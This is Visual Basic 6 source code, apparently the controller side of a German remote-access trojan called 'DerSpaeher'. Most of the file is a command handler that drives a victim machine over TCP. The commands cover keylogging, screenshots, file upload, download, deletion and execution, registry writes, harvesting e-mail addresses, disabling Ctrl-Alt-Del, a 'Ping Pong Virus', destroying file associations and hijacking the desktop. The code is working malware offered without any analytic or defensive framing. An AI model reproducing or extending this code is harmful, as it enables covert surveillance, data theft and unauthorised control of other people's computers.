End Sub


Private Sub PortR_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim strData As String
portr.GetData strData, vbString
txttextfelder(30).Text = txttextfelder(30).Text & strData
Status.InStatus strData, True
End Sub

Private Sub TCP1_Close()
IndenStatus "Close!"
LampeVerbinden "Getrennt"
If BeendenJaNein = False Then
UnloadenLoaden
Else
End If
End Sub

Private Sub TCP1_Connect()
IndenStatus "Connected"
DerSpaeher.Visible = False
Load BitteWarten
BitteWarten.Timer1.Enabled = False
BitteWarten.Label1.FontSize = 12
BitteWarten.Label1.Caption = "check password..."
BitteWarten.Label1.left = (BitteWarten.Width - BitteWarten.Label1.Width) / 2
BitteWarten.Label1.tOp = (BitteWarten.Height - BitteWarten.Label1.Height) / 2
BitteWarten.Show
If txttextfelder(10).Text = "" Then
DerSpaeher.WasSenden = "KeinPasswort": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Else
DerSpaeher.WasSenden = "PasswortAbfrage": InsStatus: tcp1.SendData DerSpaeher.WasSenden
End If
End Sub

Private Sub TCP1_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim strData As String
tcp1.GetData strData, vbString
Status.InStatus strData, True

If strData = "BildAnzeigenJetzt" Then
DerSpaeher.WasSenden = txttextfelder(23).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20

ElseIf strData = "SoundAbspielenJetzt" Then
DerSpaeher.WasSenden = txttextfelder(23).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden

GoTo 20

ElseIf strData = "TextAmDesktop" Then
DerSpaeher.WasSenden = txttextfelder(23).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden

GoTo 20

ElseIf strData = "Beep" Then
lblErgebnis.Caption = "beep OK"
ErgebnissAnz
GoTo 20

ElseIf strData = "SoundWurdeAbGespielt" Then
lblErgebnis.Caption = "play sound OK"
ErgebnissAnz
GoTo 20

ElseIf strData = "MausBewegenOK" Then
lblErgebnis.Caption = "mouse spring OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "FensterZU" Then
lblErgebnis.Caption = "window has closed"
ErgebnissAnz
GoTo 20
ElseIf strData = "MausRichtig" Then
lblErgebnis.Caption = "restore buttons OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "MausVertauschen" Then
lblErgebnis.Caption = "swap buttons OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "AllesMinimieren" Then
lblErgebnis.Caption = "minimize OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "AllesMaximieren" Then
lblErgebnis.Caption = "maximize OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "AllesVerkleinern" Then
lblErgebnis.Caption = "scaled down OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "ZweiSpalten" Then
lblErgebnis.Caption = "tile windows OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "ABild" Then
lblErgebnis.Caption = "show picture OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "GSound" Then
lblErgebnis.Caption = "play sound OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "ETaskleiste" Then
lblErgebnis.Caption = "'taskbar settings' OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "EUhr" Then
lblErgebnis.Caption = "'clock settings' OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "ESuchen" Then
lblErgebnis.Caption = "'find' OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "EAus" Then
lblErgebnis.Caption = "'start' OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "EWinBeenden" Then
lblErgebnis.Caption = "'shut down windows' OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "TextAmDesktopOK" Then
lblErgebnis.Caption = "text to screen OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "ZwischeLeer" Then
lblErgebnis.Caption = "clean clipboard OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "PassJetzt" Then
DerSpaeher.WasSenden = txttextfelder(10).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "PasswortNICHTOK" Then
tcp1.Close
TastaturUeberwachung = False
LampeVerbinden "Getrennt"
BitteWarten.Label1.Caption = "Password is FALSE"
BitteWarten.Label1.left = (BitteWarten.Width - BitteWarten.Label1.Width) / 2
BitteWarten.Label1.tOp = (BitteWarten.Height - BitteWarten.Label1.Height) / 2

BitteWarten.Timer1.Enabled = True
GoTo 20
ElseIf strData = "PasswortOK" Then
BitteWarten.Label1.Caption = "Password is TRUE"
BitteWarten.Label1.left = (BitteWarten.Width - BitteWarten.Label1.Width) / 2
BitteWarten.Label1.tOp = (BitteWarten.Height - BitteWarten.Label1.Height) / 2

BitteWarten.Timer1.Enabled = True
LampeVerbinden "Verbunden"
GoTo 20
ElseIf strData = "Passwortaendern" Then
DerSpaeher.WasSenden = txttextfelder(6).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "Passwortgeaendert" Then
lblErgebnis.Caption = "change password OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "URL" Then
DerSpaeher.WasSenden = txttextfelder(25).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "URLOK" Then
lblErgebnis.Caption = "start URL OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "TaskTrue" Then
lblErgebnis.Caption = "show Taskbar OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "TaskFalse" Then
lblErgebnis.Caption = "hide Taskbar OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "Fehler" Then
lblErgebnis.Caption = "Error"
ErgebnissAnz
GoTo 20
ElseIf strData = "ZeitOKNUN" Then
DerSpaeher.WasSenden = txttextfelder(21).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "DatumOKNUN" Then
DerSpaeher.WasSenden = txttextfelder(22).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "RegDestroyed" Then
lblErgebnis.Caption = "The file-typ has been destroyed"
ErgebnissAnz
ElseIf strData = "PingPongan" Then
lblErgebnis.Caption = "Ping Pong Virus was aktivated"
ErgebnissAnz
GoTo 20
ElseIf strData = "PingPongaus" Then
lblErgebnis.Caption = "Ping Pong Virus was disaktivated"
ErgebnissAnz
GoTo 20
ElseIf strData = "STRGan" Then
lblErgebnis.Caption = "CLT-ALT-DEL on"
ErgebnissAnz
GoTo 20
ElseIf strData = "STRGaus" Then
lblErgebnis.Caption = "CLT-ALT-DEL off"
ErgebnissAnz
GoTo 20
ElseIf strData = "Zeitt" Then
lblErgebnis.Caption = "time changed"
ErgebnissAnz
GoTo 20
ElseIf strData = "Datumm" Then
lblErgebnis.Caption = "date changed"
ErgebnissAnz
GoTo 20
ElseIf strData = "CDauf" Then
lblErgebnis.Caption = "CD-ROM open"
ErgebnissAnz
GoTo 20
ElseIf strData = "CDzu" Then
lblErgebnis.Caption = "CD-ROM close"
ErgebnissAnz
GoTo 20
ElseIf strData = "SendKeyJetzt" Then
DerSpaeher.WasSenden = txttextfelder(24).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "SendKeyOK" Then
lblErgebnis.Caption = "Send-Keys OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "KeySpyAus" Then
TastaturUeberwachung = False
lblErgebnis.Caption = "Keylogger off"
ErgebnissAnz
GoTo 20
ElseIf strData = "LocalChatClose" Then
txtChatServer.Text = txtChatServer.Text & vbCrLf & "Chat has been closed"
Timer2.Enabled = False
lblFunktionen(9).Caption = "chat"
GoTo 20
ElseIf strData = "Reg1" Then
If List5.Text = "HKEY_LOCAL_MACHINE\" Then
DerSpaeher.WasSenden = "abbb" & txttextfelder(14).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf List5.Text = "HKEY_CURRENT_USER\" Then
DerSpaeher.WasSenden = "bbbb" & txttextfelder(14).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf List5.Text = "HKEY_USERS\" Then
DerSpaeher.WasSenden = "cbbb" & txttextfelder(14).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf List5.Text = "HKEY_CLASSES_ROOT\" Then
DerSpaeher.WasSenden = "dbbb" & txttextfelder(14).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf List5.Text = "HKEY_CURRENT_CONFIG\" Then
DerSpaeher.WasSenden = "fbbb" & txttextfelder(14).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf List5.Text = "HKEY_DYN_DATA\" Then
DerSpaeher.WasSenden = "ebbb" & txttextfelder(14).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
Else
End If
GoTo 20
ElseIf strData = "Reg2" Then
Action.Text = "RegEAnkommen"
DerSpaeher.WasSenden = txttextfelder(15).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "RegSuper" Then
If List5.Text = "HKEY_LOCAL_MACHINE\" Then
DerSpaeher.WasSenden = "abbb" & txttextfelder(14).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf List5.Text = "HKEY_CURRENT_USER\" Then
DerSpaeher.WasSenden = "bbbb" & txttextfelder(14).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf List5.Text = "HKEY_USERS\" Then
DerSpaeher.WasSenden = "cbbb" & txttextfelder(14).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf List5.Text = "HKEY_CLASSES_ROOT\" Then
DerSpaeher.WasSenden = "dbbb" & txttextfelder(14).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf List5.Text = "HKEY_CURRENT_CONFIG\" Then
DerSpaeher.WasSenden = "ebbb" & txttextfelder(14).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf List5.Text = "HKEY_DYN_DATA\" Then
DerSpaeher.WasSenden = "fbbb" & txttextfelder(14).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
Else
End If

GoTo 20
ElseIf strData = "RegSuper2" Then
DerSpaeher.WasSenden = txttextfelder(15).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "RegSuper3" Then
Action.Text = "RegSuperAngekommen"
DerSpaeher.WasSenden = txttextfelder(16).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "RegSS" Then
lblErgebnis.Caption = "set Registry OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "RenDatei1" Then
DerSpaeher.WasSenden = RenDatei: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "KopieDatei1" Then
WichtigG = "wohindatei"
Dialog "Where do you want to copy the file? examble c:\Test.txt", "INPUT"

GoTo 20
ElseIf strData = "DLoeschen" Then
DerSpaeher.WasSenden = DateiName: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "DAnzeigen" Then
Action.Text = "Anschauen"
DerSpaeher.WasSenden = DateiName: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "DateiRenOK" Then
Action.Text = "DateiManager"
DerSpaeher.WasSenden = "DateiManager": InsStatus: tcp1.SendData DerSpaeher.WasSenden
LaufwerkAktiv = True
Laufwerk = True

lblErgebnis.Caption = "rename file OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "DateiKopieOK" Then
Action.Text = "DateiManager"
DerSpaeher.WasSenden = "DateiManager": InsStatus: tcp1.SendData DerSpaeher.WasSenden
LaufwerkAktiv = True
Laufwerk = True

lblErgebnis.Caption = "copy file OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "DateiWirdGesendet" Then
lblErgebnis.Caption = "sending file..."
ErgebnissAnz
GoTo 20
ElseIf strData = "DateiDownloaden" Then
DerSpaeher.WasSenden = DateiName: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "DStarten" Then
DerSpaeher.WasSenden = DateiName: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "RenOK" Then
WichtigG = "renok"
Dialog "The new filename:", "INPUT"

GoTo 20
ElseIf strData = "DateiTyp" Then
DerSpaeher.WasSenden = DateiTyp: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "DateiTypOk" Then
lblErgebnis.Caption = "file type OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "KopieOK" Then
DerSpaeher.WasSenden = DateiName: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "DateiUploaded" Then
With wskserver
      .Close
      .RemoteHost = Server
      .Connect
   End With
   With wskclient
      .Close
      .RemoteHost = Server
      .Connect
   End With
   Action.Text = "DateiManager"
DerSpaeher.WasSenden = "DateiManager": InsStatus: tcp1.SendData DerSpaeher.WasSenden
LaufwerkAktiv = True
Laufwerk = True
lblErgebnis.Caption = "File is now uploaded"
ErgebnissAnz
GoTo 20
ElseIf strData = "DateiBeimSenden" Then
lblErgebnis.Caption = "sorry, but an other file is sending at this time"
ErgebnissAnz
GoTo 20
ElseIf strData = "DateiUpLoaden" Then
IndexVonText = "111"
DateiOeffnen
DerSpaeher.WasSenden = MomentanesVerzeichnis & "\": InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "DatumOKNUN" Then
DerSpaeher.WasSenden = Text3.Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "VVV" Then
DerSpaeher.WasSenden = Text7.Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "DateiUmbenennen" Then
lblErgebnis.Caption = "rename file OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "DateiLoeschen" Then
Action.Text = "DateiManager"
DerSpaeher.WasSenden = "DateiManager": InsStatus: tcp1.SendData DerSpaeher.WasSenden
LaufwerkAktiv = True
Laufwerk = True
lblErgebnis.Caption = "kill file OK"
ErgebnissAnz
Command12.Value = True
GoTo 20
ElseIf strData = "DateiErstellen" Then
lblErgebnis.Caption = "file was created"
ErgebnissAnz
GoTo 20
ElseIf strData = "DateiStarten" Then
lblErgebnis.Caption = "start file OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "Msgboxx" Then
lblErgebnis.Caption = "msgbox OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "OK" Then
lblErgebnis.Caption = "strike"
ErgebnissAnz
GoTo 20
ElseIf strData = "DownUpAbbgebrochen" Then
With wskclient
      .Close
      .RemoteHost = Server
      .Connect
   End With
   With wskserver
      .Close
      .RemoteHost = Server
      .Connect
   End With
GoTo 20

ElseIf strData = "DownUpAbbrechenWirklich" Then
lblueberschrift(9).Caption = "screenshot"
lblScreenshoot.Caption = "no screenshot"
With wskclient
      .Close
      .RemoteHost = Server
      .Connect
   End With
   With wskserver
      .Close
      .RemoteHost = Server
      .Connect
   End With
   lblErgebnis.Caption = "up/downloading has been stopped"
ErgebnissAnz
GoTo 20
ElseIf strData = "msdosOK" Then
lblErgebnis.Caption = "ms-dos script OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "DesktopEinfrierenOK" Then
lblErgebnis.Caption = "freeze desktop OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "KeinVVV" Then
List1.Clear
List1.AddItem "no Path or Filename"
GoTo 20
ElseIf strData = "AuflG" Then
lblErgebnis.Caption = "resolution OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "GroesseScreen" Then
lblErgebnis.Caption = "screenshotsize has been fixed"
lblStatus.Visible = True
lblErgebnis.Visible = False
Timer1.Enabled = False
GoTo 20
ElseIf strData = "DesktopDrehenOK" Then
lblErgebnis.Caption = "flip screen OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "OffAn" Then
lblErgebnis.Caption = "off. keylogger on"
ErgebnissAnz
GoTo 20
ElseIf strData = "OffAus" Then
lblErgebnis.Caption = "off. keylogger off"
ErgebnissAnz
GoTo 20
ElseIf strData = "DateiLeeren" Then
lblErgebnis.Caption = "clean file OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "PortAkt" Then
lblErgebnis.Caption = "Port-Redirect on"
ErgebnissAnz
GoTo 20
ElseIf strData = "PortAktNo" Then
lblErgebnis.Caption = "Port-Redirect off"
ErgebnissAnz
GoTo 20
ElseIf strData = "FensterTop" Then
lblErgebnis.Caption = "bring to top OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "LeiderFensterNicht" Then
lblErgebnis.Caption = "close windows NOT OK"
ErgebnissAnz

ElseIf strData = "LeiderFensterN" Then
lblErgebnis.Caption = "bring to top NOT OK"
ErgebnissAnz
GoTo 20
ElseIf strData = "ICQM1" Then
DerSpaeher.WasSenden = txttextfelder(34).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
GoTo 20
ElseIf strData = "ICQMOK" Then
lblErgebnis.Caption = "ICQ Message has been send"
ErgebnissAnz
GoTo 20
ElseIf strData = "FensterHide" Then
lblErgebnis.Caption = "Windows has been hidden"
ErgebnissAnz
GoTo 20
ElseIf strData = "FensterMax" Then
lblErgebnis.Caption = "Windows has been maximized"
ErgebnissAnz
GoTo 20
ElseIf strData = "FensterMin" Then
lblErgebnis.Caption = "Windows has been minimized"
ErgebnissAnz
GoTo 20
ElseIf strData = "ICQWird" Then
lblErgebnis.Caption = "An older ICQ Message is in progress..."
ErgebnissAnz
GoTo 20




































ElseIf Action.Text = "ICQP" Then
txttextfelder(34).Text = strData
lblErgebnis.Caption = "Strike..."
ErgebnissAnz
GoTo 20
ElseIf Action.Text = "ICQU" Then
txttextfelder(34).Text = strData
lblErgebnis.Caption = "Strike..."
ErgebnissAnz
GoTo 20
ElseIf Action.Text = "AppRedirect2" Then
lblErgebnis.Caption = "Strike..."
ErgebnissAnz
Text4.Text = strData
GoTo 20
ElseIf Action.Text = "AppRedirect" Then
lblErgebnis.Caption = "Strike..."
ErgebnissAnz
txttextfelder(37).Text = strData
GoTo 20

ElseIf Action.Text = "EmailsFinden" Then
lblErgebnis.Caption = "e-mails found!!!"
ErgebnissAnz
lblErgebnis.Visible = False
lblStatus.Visible = True
Action.Text = ""
Text8.Text = ""
Text8.Text = strData
GoTo 20
ElseIf Action.Text = "OffStatus" Then
lblErgebnis.Caption = "--°°--"
ErgebnissAnz
Dialog strData, "OK"
GoTo 20
ElseIf Action.Text = "Anschauen" Then
lblErgebnis.Caption = "--°°--"
ErgebnissAnz
picContainer(25).Visible = True
picContainer(5).Visible = False
Text6.Text = strData
GoTo 20
ElseIf Action.Text = "DateiVerz" Then
If strData = "KeinVVV" Then
List1.Clear
List1.AddItem "no path or filename"
Action.Text = ""
GoTo 20
Else
End If
Text3.Text = strData
If Laufwerk = True Then
MomentanesVerzeichnis = BHJ
Else
MomentanesVerzeichnis = BHJ
End If
TextErmitteln2
LaufwerkAktiv = False
Laufwerk = False
GoTo 20

ElseIf Action.Text = "DateiManager" Then
If strData = "KeinVVV" Then
List1.Clear
List1.AddItem "no path or filename"
Action.Text = ""
GoTo 20
Else
End If
Text3.Text = strData
LaufwerkAktiv = True
Laufwerk = True
TextErmitteln2
GoTo 20
ElseIf Action.Text = "RegEAnkommen" Then
txttextfelder(17).Text = strData
GoTo 20
ElseIf Action.Text = "ZeitAbr" Then
txttextfelder(19).Text = strData
Action.Text = ""
GoTo 20
ElseIf Action.Text = "DatumAbrr" Then
txttextfelder(20).Text = strData
Action.Text = ""
GoTo 20
ElseIf Action.Text = "KeySpy" Then
Text2.Text = Text2.Text & strData
GoTo 20
ElseIf Action.Text = "AlleFenster" Then
lblErgebnis.Caption = "--°°--"
ErgebnissAnz
Text3.Text = strData
Soo = 0
TextErmitteln
Action.Text = ""
GoTo 20
ElseIf Action.Text = "SysI" Then
Text1.Text = strData
Action.Text = ""
GoTo 20
ElseIf Action.Text = "Chat" Then
txtChatServer.Text = strData
GoTo 20
ElseIf Action.Text = "WelcherUser" Then
Dialog strData, "OK"
GoTo 20
Else
End If

20:
End Sub

Private Sub TcpWho_Connect(Index As Integer)
List8.AddItem List7.List(Index - 1)
End Sub

Private Sub Text2_Change()
Text2.SelStart = Len(Text2.Text)
End Sub

Private Sub Timer4_Timer()
On Error Resume Next
For Each Socket In TcpWho
        Socket.Close
        Unload Socket
    Next
lblueberschrift(38).Caption = "Who is online..."
Timer4.Enabled = False
End Sub

Private Sub Timer5_Timer()
wskserver.SendData DateiData
Timer5.Enabled = False
End Sub

Private Sub Timer1_Timer()
lblStatus.Visible = True
lblErgebnis.Visible = False
Timer1.Enabled = False
IndenStatusNormal " -->p.w.m. off"
End Sub

Private Sub Timer2_Timer()
On Error Resume Next
DerSpaeher.WasSenden = txtChatClient.Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
End Sub

Private Sub tmrVerbinden_Timer()
lblZeit = lblZeit - 1
If lblZeit <= 0 Then
tmrVerbinden.Enabled = False
lblZeit.Caption = "10"
LampeVerbinden "Getrennt"
lblersatz(5).Caption = "connect"
Else
End If
End Sub

Private Sub txttextfelder_Change(Index As Integer)
On Error GoTo z
If Index = 5 Then
Dim a As Long
a = txttextfelder(5).Text
ElseIf Index = 11 Then
Dim gh As String
gh = txttextfelder(11).Text
Else
End If
Exit Sub
z:
If Index = 5 Then
txttextfelder(5).Text = "0"
ElseIf Index = 11 Then
txttextfelder(11).Text = ""
Else
End If

End Sub

Private Sub txttextfelder_Click(Index As Integer)
On Error Resume Next
Dim indx As Integer
For indx = 0 To GruenAnzahl
txttextfelder(indx).BackColor = &H808000
Next
lstIPErgebnisse.BackColor = &HC0C000
txttextfelder(Index).BackColor = &H8000&
End Sub

Sub DateiOeffnen()
        Dim o As OPENFILENAME
    Dim wSize As Long
    #If Win32 Then
        Dim Memhandle As Long, hWnd As Long
    #Else
        Dim Memhandle As Integer, hWnd As Integer, address As Long
    #End If
    

    szFile$ = String$(128, 0)
    szFilter$ = "Alle-Dateien" + Chr$(0) + "*.*"

    #If Win16 Then
        wSize = Len(szFile$) + Len(szFilter$)
        Memhandle = GlobalAlloc(GHND, wSize)
        If Memhandle = 0 Then Exit Sub
        address = GlobalLock(Memhandle)
        Call MemoryCopy(ByVal address, ByVal (szFile$ + szFilter$), wSize)
    #End If
  
    o.lStructSize = Len(o)
    o.hwndOwner = hWnd
    o.Flags = OFN_FILEMUSTEXIST Or OFN_HIDEREADONLY Or OFN_PATHMUSTEXIST
    o.nFilterIndex = 1
    o.nMaxFile = Len(szFile$)
    
    #If Win32 Then
        o.lpstrFile = szFile$
        o.lpstrFilter = szFilter$
    #Else
        o.lpstrFile = address
        o.lpstrFilter = address + Len(szFile$)
    #End If

    result = GetOpenFileName(o)
    If result = 0 Then Exit Sub

    #If Win16 Then
        If result <> 0 Then Call MemoryCopy(ByVal szFile$, ByVal address, Len(szFile$))
        Ok = GlobalUnlock(Memhandle)
        Ok = GlobalFree(Memhandle)
        File$ = left$(szFile$, InStr(szFile$, Chr$(0)) - 1)
    #Else
        File$ = left$(o.lpstrFile, InStr(o.lpstrFile, Chr$(0)) - 1)
    #End If
    Dim DateiEchtName
DateiEchtName = Right(left$(o.lpstrFile, InStr(o.lpstrFile, Chr$(0)) - 1), Len(left$(o.lpstrFile, InStr(o.lpstrFile, Chr$(0)) - 1)) - o.nFileOffset)
Dim VerzeichnissEcht
VerzeichnissEcht = left(left$(o.lpstrFile, InStr(o.lpstrFile, Chr$(0)) - 1), o.nFileOffset)
If IndexVonText = "111" Then
DownLoadVerzeichniss = VerzeichnissEcht
DateiSenden File$
Exit Sub
Else
End If
    txttextfelder(IndexVonText).Text = File$
End Sub
Sub VerbindungAufbauen()
On Error GoTo z
If lblersatz(5).Caption = "connect" Then
TastaturUeberwachung = False
tcp1.Close
TastaturUeberwachung = False
Server = txttextfelder(9).Text
tcp1.RemoteHost = Server
tcp1.Connect
With wskclient
      .Close
      .RemoteHost = Server
      .Connect
   End With
   With wskserver
      .Close
      .RemoteHost = Server
      .Connect
   End With
Else
tcp1.Close
TastaturUeberwachung = False
LampeVerbinden "Getrennt"
End If
Exit Sub
z:
UnloadenLoaden
End Sub
Sub UnloadenLoaden()
Unload DerSpaeher
Load BitteWarten
BitteWarten.Label1.left = (BitteWarten.Width - BitteWarten.Label1.Width) / 2
BitteWarten.Label1.tOp = (BitteWarten.Height - BitteWarten.Label1.Height) / 2
BitteWarten.Show
End Sub

Sub ErgebnissAnz()

lblStatus.Visible = False
lblErgebnis.Visible = True
Timer1.Enabled = False
Timer1.Enabled = True
IndenStatusNormal " -->p.w.m.  on"
End Sub

Sub KeineVerbindung()
IndenStatus "no connection!"
lblStatus.Visible = False
lblErgebnis.Visible = True
lblErgebnis.Caption = "you are not connected"
Timer1.Enabled = False
Timer1.Enabled = True
End Sub
Public Function StartURL(URL As String) As Long
Dim Scr_hDC As Long
Scr_hDC = GetDesktopWindow()
StartURL = ShellExecute(Scr_hDC, "Open", URL, "", "C:\", SW_SHOWNORMAL)
End Function
Sub BakDateiAnlegen()
On Error GoTo z
FileCopy txttextfelder(7), "C:\DerSpaeher3.Bak"
Exit Sub
z:

End Sub
Private Function ReadLine(iLine As Integer) As String
    Dim m_intRet
    m_sLineString = Space$(1056)
    m_intRet = SendMessage(Text3.hWnd, EM_GETLINE, iLine, ByVal m_sLineString)
    ReadLine = m_sLineString
    SaveSetting "Abc", "Abc", Soo, m_intRet
    Soo = Soo + 1
End Function

Sub TextErmitteln()
On Error GoTo Filth
m_lngRet = SendMessage(Text3.hWnd, EM_GETLINECOUNT, 0, 0)
    AnzahlDerZeilenVonAlleFenster = Str$(m_lngRet)
List2.Clear
Dim u As Integer
For u = 0 To AnzahlDerZeilenVonAlleFenster
    List2.AddItem ReadLine(Val(u) - 1)
    Next
    Soo = 0
    Exit Sub
Filth:
End Sub
Private Function ReadLine2(iLine As Integer) As String
    Dim m_intRet
    m_sLineString = Space$(1056)
    m_intRet = SendMessage(Text3.hWnd, EM_GETLINE, iLine, ByVal m_sLineString)
    ReadLine2 = m_sLineString
    SaveSetting "Abc2", "Abc2", Soo2, m_intRet
    Soo2 = Soo2 + 1
End Function

Sub TextErmitteln2()
On Error GoTo Filth
Soo2 = 0
m_lngRet = SendMessage(Text3.hWnd, EM_GETLINECOUNT, 0, 0)
    AnzahlDerZeilenVonAlleFenster2 = Str$(m_lngRet)
List1.Clear
Dim u As Integer
For u = 0 To AnzahlDerZeilenVonAlleFenster2
    List1.AddItem ReadLine2(Val(u) - 1)
    Next
    Soo2 = 0
    Exit Sub
Filth:
End Sub


Private Sub txttextfelder_KeyUp(Index As Integer, KeyCode As Integer, Shift As Integer)
If Index = 4 Then
If KeyCode = 190 Then
Dim a
a = left(txttextfelder(4).Text, Len(txttextfelder(4).Text) - 1)
txttextfelder(4).Text = a
Dialog "No file type please", "OK"
Exit Sub
Else
End If
Else
End If
End Sub

Private Sub wskServer_Close()
wskserver.Close
End Sub
Private Sub wskServer_DataArrival(ByVal bytesTotal As Long)

   Dim NewData As String
   wskserver.GetData NewData
   If NewData = "R_" Then SendingFile = True
   SendingFile = True
Exit Sub
   If NewData = "N_" Then
       AbortFile = True
          End If

End Sub
Private Sub wskServer_SendComplete()

   If SendingFile Then
   SendingFile = False
   End If


End Sub

Private Sub wskClient_Close()
   wskclient.Close
End Sub

Private Sub wskClient_DataArrival(ByVal bytesTotal As Long)
Dim NewData As String
wskclient.GetData NewData
   Static Filename As String
   Static FileSize As Long
   
   If left(NewData, 2) = "S_" Then
  
      FileSize = Val(Mid(NewData, 3, 3 + InStr(4, NewData, "_")))
      Filename = Mid(NewData, InStr(4, NewData, "_") + 1)
      
      Dim Question As String
      Dim Answer As VbMsgBoxResult
      
         RecievedFile = ""
         wskclient.SendData "R_"
         BeginTransfer = Timer
   Else
      RecievedFile = RecievedFile & NewData
      If Len(RecievedFile) = FileSize Then
         Open DownLoadVerzeichniss & Filename For Binary As #1
         Put #1, 1, RecievedFile
         Close

        If Filename = "Screen.bmp" Then
        DerSpaeher.WasSenden = "DownUpAbbrechenWirklich": InsStatus: tcp1.SendData DerSpaeher.WasSenden
        lblueberschrift(9).Caption = "screenshot"
        lblScreenshoot.Caption = "no screenshot"
        Load Screen
        Screen.Picture = LoadPicture("Screen.bmp")
        Screen.Show
        Else
        lblErgebnis.Caption = "download ready!"
        ErgebnissAnz
        End If
      End If
      DoEvents
   
   End If


   Exit Sub
   
ErrorHandler:

End Sub
Sub DateiSenden(File)
On Error GoTo h
Dim dd
dd = FileLen(File)
SendFile File
Exit Sub
h:

End Sub
Private Sub SendFile(ByVal Filename As String)
On Error Resume Next
   Dim FileData As String
   Dim ByteData As Byte
   Dim Counter As Long

   Open Filename For Binary As #1
   
   
   
   DoEvents
   FileData = Input(LOF(1), 1)
   
   Close
   
   SendingFile = False
   AbortFile = False
   lblBytesIngesamt.Caption = Len(FileData)
   
   wskserver.SendData "S_" & Len(FileData) & "_" & Filetitle(Filename)

   Do Until SendingFile = True Or AbortFile = True Or DoEvents = 0
  Loop
  BeginTransfer = Timer
DateiData = FileData
Timer5.Enabled = True
End Sub
Private Function Filetitle(ByVal Filename As String) As String

   Dim i As Integer
   Dim temp As String
   If InStr(Filename, "\") <> 0 Then
      i = Len(Filename)
      Do Until left(temp, 1) = "\"
         i = i - 1
         temp = Mid(Filename, i)
      Loop
      Filetitle = Mid(temp, 2)
   Else
      Filetitle = Filename
   End If

End Function

Sub BW()
lblErgebnis.Visible = True
lblStatus.Visible = False
lblErgebnis.Caption = "please wait..."
End Sub
Public Function BitteWartenOderNicht()
If lblErgebnis.Caption = "please wait..." Then
BitteWartenOderNicht = "True"
Else
BitteWartenOderNicht = "False"
End If
End Function

